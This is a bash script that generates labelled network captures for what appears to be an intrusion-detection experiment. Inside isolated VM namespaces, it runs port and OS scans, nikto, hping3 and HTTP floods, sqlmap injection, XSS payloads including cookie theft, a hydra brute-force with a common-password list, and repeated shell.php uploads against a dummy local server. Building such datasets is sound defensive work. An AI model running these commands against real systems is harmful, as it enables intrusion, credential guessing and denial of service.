#!/bin/bash
# Fresh-traffic experiment, capture half. Run as root inside the VM:  sudo bash fresh_capture.sh
# Everything happens between two network namespaces joined by one virtual cable. No route leaves the VM.
# Attacks are bounded (timeouts, packet caps, <=1000 packets/s) and aimed only at the dummy server below.
set -u
D=$(cd "$(dirname "$0")" && pwd)
OUT="$D/../../arena_assets/fresh"
mkdir -p "$OUT"
TGT=10.77.0.2
ip netns del fa 2>/dev/null; ip netns del ft 2>/dev/null
ip netns add fa; ip netns add ft
ip link add va type veth peer name vt
ip link set va netns fa; ip link set vt netns ft
ip netns exec fa ip addr add 10.77.0.1/24 dev va; ip netns exec fa ip link set va up; ip netns exec fa ip link set lo up
ip netns exec ft ip addr add $TGT/24 dev vt;     ip netns exec ft ip link set vt up; ip netns exec ft ip link set lo up
ip netns exec ft python3 "$D/fresh_server.py" $TGT &
SRV=$!
sleep 1.5
printf 'password\n123456\nadmin\nletmein\nqwerty\nwelcome\nmonkey\ndragon\nsunshine\nmaster\nlogin\nabc123\nfootball\nshadow\nsecret\ns3cret\n' > /tmp/pw.txt
for i in $(seq 1 15); do cat /tmp/pw.txt; done > /tmp/pw_big.txt

cap() {  # cap <class> <seconds> <command...> : capture up to 3000 packets of the command's traffic
  local cls=$1 secs=$2; shift 2
  ip netns exec ft timeout $((secs+8)) tcpdump -i vt -c 3000 -U -w "$OUT/$cls.pcap" >/dev/null 2>&1 &
  local T=$!
  sleep 1
  ip netns exec fa timeout $secs "$@" >/dev/null 2>&1
  sleep 1.5
  kill $T 2>/dev/null; wait $T 2>/dev/null
  echo "$cls: $(tcpdump -nr "$OUT/$cls.pcap" 2>/dev/null | wc -l) packets"
}

cap Port_Scanning        60 nmap -sS -p 1-1000 -T4 $TGT
cap Fingerprinting       60 nmap -O -sS --osscan-guess -p 1-1000 $TGT
cap Vulnerability_scanner 50 nikto -h http://$TGT:8000 -maxtime 40s
cap DDoS_TCP             15 hping3 -S -p 8000 -i u1000 -c 3000 $TGT
cap DDoS_UDP             15 hping3 --udp -p 9999 -i u1000 -c 3000 $TGT
cap DDoS_ICMP            15 hping3 --icmp -i u1000 -c 3000 $TGT
cap DDoS_HTTP            30 python3 -c "
import threading, urllib.request
def w():
    for _ in range(250):
        try: urllib.request.urlopen('http://$TGT:8000/', timeout=2).read()
        except Exception: pass
ts=[threading.Thread(target=w) for _ in range(12)]
[t.start() for t in ts]; [t.join() for t in ts]"
cap SQL_injection        60 sqlmap -u "http://$TGT:8000/item?id=1" --batch --level 2 --risk 1 --time-limit 45 --smart --disable-coloring
cap XSS                  20 bash -c 'for i in $(seq 1 40); do for p in "<script>alert(1)</script>" "<img src=x onerror=alert($i)>" "<svg onload=alert(1)>" "\"><script>alert(document.cookie)</script>" "javascript:alert(1)"; do curl -s -G --data-urlencode "q=$p" http://'$TGT':8000/search >/dev/null; done; done'
cap Password             45 hydra -l admin -P /tmp/pw_big.txt -s 8000 -t 4 $TGT http-post-form "/login:user=^USER^&pass=^PASS^:F=denied"
echo '<?php echo "test"; ?>' > /tmp/shell.php; echo 'hello' > /tmp/doc.txt
cap Uploading            30 bash -c 'for i in $(seq 1 150); do curl -s -F "file=@/tmp/shell.php" http://'$TGT':8000/upload >/dev/null; curl -s -F "file=@/tmp/doc.txt" http://'$TGT':8000/upload >/dev/null; done'
cap Normal               20 bash -c 'for i in $(seq 1 120); do curl -s http://'$TGT':8000/ >/dev/null; curl -s "http://'$TGT':8000/item?id=$i" >/dev/null; curl -s -d "user=admin&pass=s3cret" http://'$TGT':8000/login >/dev/null; sleep 0.1; done'

kill $SRV 2>/dev/null
ip netns del fa; ip netns del ft
echo done
